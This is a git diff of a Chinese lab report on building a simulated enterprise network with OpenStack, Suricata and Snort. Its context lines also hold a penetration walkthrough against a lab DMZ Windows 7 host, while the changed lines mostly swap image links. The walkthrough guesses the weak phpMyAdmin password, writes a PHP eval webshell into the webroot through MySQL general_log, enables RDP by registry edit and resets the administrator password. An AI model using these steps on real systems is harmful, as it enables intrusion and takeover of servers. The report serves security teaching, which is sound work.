@@ -100,7 +100,7 @@ DMZ一般不能访问外网
 
 华为 eNSP ，又称华为企业网络仿真平台，是华为提供的一款免费的网络仿真工具平台，主要是对企业网的路由器、交换机、防火墙、无线设备进行软件仿真，可以在没有真实设备的情况下也能够进行网络实验测试，学习网络技术。
 
-![](https://s3.hedgedoc.org/demo/uploads/1a59d473-6f7f-496f-ad8d-a62ddf106bd6.png)
+<img width="365" alt="1a59d473-6f7f-496f-ad8d-a62ddf106bd6" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8044e85f-ddb0-4973-b909-7ecc1dc5a209">
 
 由于这两个软件的集成化程度很高，这样的配备方案可以快速、简单地实现整个企业环境的搭建，但相应地也会带来问题，比如：StarVCenter没有良好的讨论社区，如果遇到问题很难找到解决方案；eNSP仿真平台可能与实际环境存在差异，影响后续攻防尝试的效果；整体企业环境配备过于一体化，没有办法在配备过程中，学习到企业环境配置的相关知识。
 
@@ -122,11 +122,11 @@ OpenStack云平台搭建需要两个节点，一个是controller（控制节点�
 
 **controller网卡配置如下：**
 
-![](https://s3.hedgedoc.org/demo/uploads/f766b458-c7b5-4d27-9400-771bd18c39b3.png)
+<img width="412" alt="f766b458-c7b5-4d27-9400-771bd18c39b3" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/ad0f03cd-116d-43cb-9a34-c4a3306b75f0">
 
 **conpute网卡配置如下：**
 
-![](https://s3.hedgedoc.org/demo/uploads/6f60eb9d-064b-423d-aeee-624aab0bfefc.png)
+<img width="411" alt="6f60eb9d-064b-423d-aeee-624aab0bfefc" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/e2f4528c-d2b8-47e2-bd35-d17fb19b7b91">
 
 **配置步骤：**
 
@@ -138,10 +138,10 @@ OpenStack云平台搭建需要两个节点，一个是controller（控制节点�
 6. 在Cotroller节点和Compute节点分别刷新脚本
 
 **结果展示：**
+<img width="196" alt="b3bd3032-7af4-4483-b296-dada6574c43c" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/7622e7b7-9f1b-45a7-b777-ef0c55b284f7">
 
-![](https://s3.hedgedoc.org/demo/uploads/b3bd3032-7af4-4483-b296-dada6574c43c.png)
+<img width="444" alt="66e2217e-b742-4ac0-ad6a-48189e6db126" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/bb3a9a51-2562-4030-9d8b-1b593b205167">
 
-![](https://s3.hedgedoc.org/demo/uploads/66e2217e-b742-4ac0-ad6a-48189e6db126.png)
 
 #### OpenStack如何实现与其他主机的互联
 
@@ -150,28 +150,27 @@ OpenStack云平台搭建需要两个节点，一个是controller（控制节点�
 - 添加网关配置，与物理机保持一致
 - 选择桥接模式网络
 
-![](https://s3.hedgedoc.org/demo/uploads/70b33e92-0817-4dcc-a1eb-18ba060d7f5d.png)
+<img width="407" alt="70b33e92-0817-4dcc-a1eb-18ba060d7f5d" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/2ea3b734-91a9-4a9e-9bbd-38896e63a03d">
 
 （2）将虚拟机的端口映射到主机的端口上
 
-![](https://s3.hedgedoc.org/demo/uploads/f71a2959-ea72-4ec3-aaca-9f5cc525098f.png)
+
+<img width="365" alt="f71a2959-ea72-4ec3-aaca-9f5cc525098f" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8f0b763d-e5c2-405f-8253-c530beba027c">
 
 例如：把虚拟机80端口映射到主机8090端口
 
 
 https://71423st062.goho.co/dashboard/auth/login/
 
-![](https://s3.hedgedoc.org/demo/uploads/482c0376-9e5f-4463-9999-e9d1108ef179.png)
-
+![482c0376-9e5f-4463-9999-e9d1108ef179](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/6ac12bcd-17e5-40ea-bfc4-87cee8a1fdfc)
 
 admin登录openstack
 
-![](https://s3.hedgedoc.org/demo/uploads/3e060c30-57d1-40ad-aa68-e0f7dd748817.png)
+![3e060c30-57d1-40ad-aa68-e0f7dd748817](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/4cda710e-bb43-4684-aa91-065b70903dd7)
 
 
 user登录openstack
-
-![](https://s3.hedgedoc.org/demo/uploads/d7d1894b-ff03-4f7d-b44e-a4fa831de183.png)
+![d7d1894b-ff03-4f7d-b44e-a4fa831de183](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/26b7bb62-234a-4683-b5ab-783f9684ebda)
 
 ## IPS/IDS
 ### IDS/IPS调研
@@ -322,8 +321,7 @@ systemctl disable firewalld.service
 vi /etc/sysconfig/network-scripts/ifcfg-ens33
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/8061bb29-9f8e-427f-860e-6f72a79408db.png)
-
+![8061bb29-9f8e-427f-860e-6f72a79408db](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/4a651799-a55f-4e8c-874e-2fbb2df72f24)
 
 重启网卡
 
@@ -338,7 +336,7 @@ service network restart
 vi /etc/sysconfig/network-scripts/ifcfg-ens36
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/7c822d17-0ad2-4ff8-b276-8c99d27f5409.png)
+![7c822d17-0ad2-4ff8-b276-8c99d27f5409](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/1bc4c752-407f-4f12-948e-bde67fede1d6)
 
 
 ```Bash
@@ -356,7 +354,7 @@ net.ipv4.ip_forward = 1
 #查看是否配置成功
 sysctl -p
 ```
-![](https://s3.hedgedoc.org/demo/uploads/2b947abf-4056-4ca4-8d08-a61c616a201f.png)
+![2b947abf-4056-4ca4-8d08-a61c616a201f](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/c128ccb4-68f0-4af6-8558-e474e91ee851)
 
 这时虚拟机Host就可以ping通Gateway了，但仍然无法访问外网。
 
@@ -433,7 +431,7 @@ iptables -vnL
 vi /etc/suricata/suricata.yaml
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/40df7c8d-99e9-48d8-a47f-66d810c2211a.png)
+![40df7c8d-99e9-48d8-a47f-66d810c2211a](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/56f77f3f-76db-4c77-baf0-1b67df4ce4e2)
 
 
 查看可用规则源
@@ -442,8 +440,6 @@ vi /etc/suricata/suricata.yaml
 suricata-update
 suricata-update list-sources
 ```
-
-![](https://s3.hedgedoc.org/demo/uploads/9603dcd3-c820-41b9-8041-5c49829368ac.png)
 
 
 启用ptresearch/attackdetection的规则集
@@ -476,7 +472,7 @@ suricata -c /etc/suricata/suricata.yaml -q 0
 cat /var/log/suricata/fast.log
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/d9ae1339-4d7f-49b7-a550-4496bafd5dd0.png)
+![d9ae1339-4d7f-49b7-a550-4496bafd5dd0](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/70ba76aa-e73d-48d1-b94c-5bb13299e34c)
 
 
 ### snort部署（IDS）
@@ -547,7 +543,8 @@ apt-get install snort
 - JumpServer
     - 具有开源、无插件、分布式、多云支持、云端存储、多租户等优势；
     - 被很多大企业作为堡垒机使用：
-        ![](https://s3.hedgedoc.org/demo/uploads/4bac8006-e6e3-4e61-b8e2-1e99cb4a5d02.png)
+      
+<img width="420" alt="4bac8006-e6e3-4e61-b8e2-1e99cb4a5d02" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/75e2acb5-b022-4be9-b390-d27027bf1c8c">
 
 - Teleport
 - Next Terminal
@@ -562,36 +559,32 @@ apt-get install snort
 
 第一张网卡（内网）：
 
-![](https://s3.hedgedoc.org/demo/uploads/4b12c292-0b6f-4047-987d-edf78a1a1a0f.png)
+![4b12c292-0b6f-4047-987d-edf78a1a1a0f](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/5bf9e1db-8020-41b6-933c-254cdb965bd4)
 
 
 第二张网卡（公网）：
 
-![](https://s3.hedgedoc.org/demo/uploads/61f81dfa-d5c9-44ec-8a34-ae0026148fb1.png)
+![61f81dfa-d5c9-44ec-8a34-ae0026148fb1](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/7bdfca8d-7c01-4507-b02f-481eb698fc72)
 
 启动phpstudy环境：
 
-![](https://s3.hedgedoc.org/demo/uploads/a4d0002d-a5eb-4742-930f-c46745755676.png)
 
+![a4d0002d-a5eb-4742-930f-c46745755676](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/0f4e13a5-9834-4309-929b-3c85e678e72e)
 
 
 ### **（2）内网办公区主机**
 
 **配置网卡为VMnet3:**
-
-![](https://s3.hedgedoc.org/demo/uploads/c103bcd8-6b21-451c-b300-c23fb31cfc4d.png)
+![c103bcd8-6b21-451c-b300-c23fb31cfc4d](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/55861654-c70e-4dfa-b1c4-e083a901e185)
 
 **IP地址为：192.168.52.141**
 
-![](https://s3.hedgedoc.org/demo/uploads/95f0ec89-6d07-4904-9526-47bf049de755.png)
+![95f0ec89-6d07-4904-9526-47bf049de755](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8cf47456-0ed9-46c3-ad73-c2ebdbb0b2d8)
 
 
 **可以ping通DMZ区的win7：**
 
-![](https://s3.hedgedoc.org/demo/uploads/78c00fdd-2c70-4e5c-a624-fc0cadcd25ac.png)
-
-
-
+![78c00fdd-2c70-4e5c-a624-fc0cadcd25ac](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/c9eaa652-82c9-4a5a-a4c8-34dbb8e082b2)
 
 
 ### 二、渗透攻击
@@ -615,45 +608,44 @@ nmap -T4 -A -v http://192.168.111.128/
 -A 操作系统及版本探测
 -v 显示详细的输出
 
-![](https://s3.hedgedoc.org/demo/uploads/c8ea6cad-c652-4e86-85ef-f2a4c3feb5d7.png)
+![c8ea6cad-c652-4e86-85ef-f2a4c3feb5d7](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/72c0dbc9-c8d4-4ef3-81c6-5f547d601ce8)
 
 
 访问80端口，发现web页面：
 
-![](https://s3.hedgedoc.org/demo/uploads/7d4d3d02-e7d1-4502-b9e5-9eb25ad2c325.png)
 
+
+![7d4d3d02-e7d1-4502-b9e5-9eb25ad2c325](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/a464eb53-120c-42aa-ab73-8050f6ee0e67)
 
 **扫描网站目录：**
 
-![](https://s3.hedgedoc.org/demo/uploads/8e2d46c4-0b92-4995-ab0f-412ba6ba99c7.png)
+![8e2d46c4-0b92-4995-ab0f-412ba6ba99c7](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/39e8a089-0f7f-4f08-a35a-5f7819e98505)
 
 **备份文件夹（beifen.rar）：**
 
-![](https://s3.hedgedoc.org/demo/uploads/fc0e14cf-fc91-4481-bf76-fa52a7786688.png)
+![fc0e14cf-fc91-4481-bf76-fa52a7786688](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/774b34af-1fec-4dbc-a238-74eef0e1ce80)
 
 **phpinfo页面：**
 
-![](https://s3.hedgedoc.org/demo/uploads/e56ea589-e6be-46cb-94cd-a9c9afedf55f.png)
-
+![e56ea589-e6be-46cb-94cd-a9c9afedf55f](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/339a9a58-b725-4c78-bf36-f31c57b94ecb)
 
 
 
 **phpmyadmin页面：**
 
-![](https://s3.hedgedoc.org/demo/uploads/56bda7ee-3de6-4bec-b9b5-a56872965ad1.png)
+![56bda7ee-3de6-4bec-b9b5-a56872965ad1](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/eac386c0-b3cc-407d-9a69-77c7b4a6c151)
 
 
 **爆破密码：**
 
-![](https://s3.hedgedoc.org/demo/uploads/85d1fe27-f57a-4026-9de9-913f1b85b778.png)
+![85d1fe27-f57a-4026-9de9-913f1b85b778](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/a34726b8-c62a-45fc-aea3-72eb7e70d844)
 
 
 是一个弱口令root——root
 
-![](https://s3.hedgedoc.org/demo/uploads/7b90de00-b113-4ec2-80c1-981a0166c06f.png)
+![7b90de00-b113-4ec2-80c1-981a0166c06f](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/85022543-e1e3-49ed-aed0-3aec1f533cda)
 
-
-![](https://s3.hedgedoc.org/demo/uploads/fd3ecda9-8aac-4baa-9a8e-3dda8a4ae04d.png)
+![fd3ecda9-8aac-4baa-9a8e-3dda8a4ae04d](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/835bc7e9-313e-4aa1-9f18-a11c3d0ffa97)
 
 
 **利用phpmyadmin进行getshell：**
@@ -670,8 +662,7 @@ SHOW VARIABLES LIKE 'general%'
 
 
 
-![](https://s3.hedgedoc.org/demo/uploads/14f42dd7-651b-4c14-abee-21d176f3b133.png)
-
+![14f42dd7-651b-4c14-abee-21d176f3b133](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/12c7ba01-ebcd-416a-8332-9e829cde82b2)
 
 **开启general_log:**
 
@@ -679,7 +670,7 @@ SHOW VARIABLES LIKE 'general%'
 set global general_log = "ON";
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/f93f462c-a268-4579-ac9b-e6540a74c213.png)
+![f93f462c-a268-4579-ac9b-e6540a74c213](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/49f207e0-7b6b-4cb4-821e-fca5d4e96e42)
 
 
 **更改日志文件位置:**
@@ -689,12 +680,12 @@ set global general_log = "ON";
 set global general_log_file='C:/phpStudy/WWW/1.php';
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/6d05c1f6-b552-44f4-8dad-186beee7bf71.png)
+![6d05c1f6-b552-44f4-8dad-186beee7bf71](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/e7a3a1b8-8211-40b8-ace6-e621df3d398a)
 
 
 **再次查询：**
 
-![](https://s3.hedgedoc.org/demo/uploads/9f752d18-20b3-46ad-a1d7-aac856f3f504.png)
+![9f752d18-20b3-46ad-a1d7-aac856f3f504](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/35a1d163-91db-4045-bf2d-b7ba82787263)
 
 
 **向日志内写入一句话木马：**
@@ -703,25 +694,25 @@ set global general_log_file='C:/phpStudy/WWW/1.php';
 select '<?php eval($_POST[1]); ?>';
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/d8024002-4eb4-4dbc-9bfc-22f1fe0963de.png)
+![d8024002-4eb4-4dbc-9bfc-22f1fe0963de](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/1a51eefd-be2a-48e2-a4ef-5cac1ff1b104)
 
 
 phpstudy探针页面下方有回显：
 
-![](https://s3.hedgedoc.org/demo/uploads/8ff9e3e9-df37-4ff6-a51a-1e53b33f5862.png)
+![8ff9e3e9-df37-4ff6-a51a-1e53b33f5862](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8a4275da-f115-42d3-802a-d5323df6e701)
 
 
 **使用蚁剑连接：**
 
-![](https://s3.hedgedoc.org/demo/uploads/c993b9de-b72e-4220-98ae-cc39c9b989e1.png)
+![c993b9de-b72e-4220-98ae-cc39c9b989e1](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/da039637-e14c-4062-af5b-8931707af707)
 
 
 **查看用户和ip：**
-![](https://s3.hedgedoc.org/demo/uploads/dc3c684c-2477-4a76-b66f-09fb024374ca.png)
+![dc3c684c-2477-4a76-b66f-09fb024374ca](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/3dc6a9ee-196b-4503-ad4d-5b91933547a3)
 
 
 
-![](https://s3.hedgedoc.org/demo/uploads/be63aac0-0a3d-4cd4-b8f2-29a61eae1404.png)
+![be63aac0-0a3d-4cd4-b8f2-29a61eae1404](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/afc3ce73-03ae-42cb-9d81-37193a9873ef)
 
 
 **开启3389端口，准备远程桌面登录：**
@@ -730,15 +721,15 @@ phpstudy探针页面下方有回显：
 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/c99da025-de2d-4488-ae69-a35ecca5aabd.png)
+![c99da025-de2d-4488-ae69-a35ecca5aabd](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/043da0d1-8092-45da-ac98-f1a4597b53f1)
 
 
-![](https://s3.hedgedoc.org/demo/uploads/b376ce05-7af2-4866-881b-169167493908.png)
+![b376ce05-7af2-4866-881b-169167493908](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/1ace9c19-e50d-4f43-99e3-ab7d5338614d)
 
 
 需要密码，可以直接修改：
 
-![](https://s3.hedgedoc.org/demo/uploads/c62a95fd-145a-436c-bea5-4d3b394e2e9e.png)
+![c62a95fd-145a-436c-bea5-4d3b394e2e9e](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/23640e74-28a7-46b7-8853-162b75859c56)
 
 
 ```sh
@@ -747,15 +738,15 @@ net user administrator admin@123 \\更改密码
 net user administrator /active:yes \\激活密码
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/8d444ddb-0c0b-40df-8a0e-bc77d022f66e.png)
+![8d444ddb-0c0b-40df-8a0e-bc77d022f66e](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/da22c9a8-7e35-4733-a54b-be9a84b1f04d)
 
 
-![](https://s3.hedgedoc.org/demo/uploads/10f38d74-121d-4d8b-b142-948beb9942a0.png)
+![10f38d74-121d-4d8b-b142-948beb9942a0](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/d942ef07-013d-4dab-8760-9abeb8a56fae)
 
 win7服务器显示的状态：
 
-![](https://s3.hedgedoc.org/demo/uploads/48ac6141-7695-45f0-baa2-540bf4df1961.png)
 
+![48ac6141-7695-45f0-baa2-540bf4df1961](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/95bed4eb-65f6-4674-8ba3-c205fef002a9)
 
 在蚁剑中关机，重启时远程连接
 
@@ -763,7 +754,7 @@ win7服务器显示的状态：
 shutdown -r -t 0
 ```
 
-![](https://s3.hedgedoc.org/demo/uploads/7c243edd-4803-46aa-a24b-f7042e956412.png)
+![7c243edd-4803-46aa-a24b-f7042e956412](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8222bbd1-a3c8-4b80-8969-f2867b63b6b8)
 
 
 **成功控制DMZ区web服务器：**
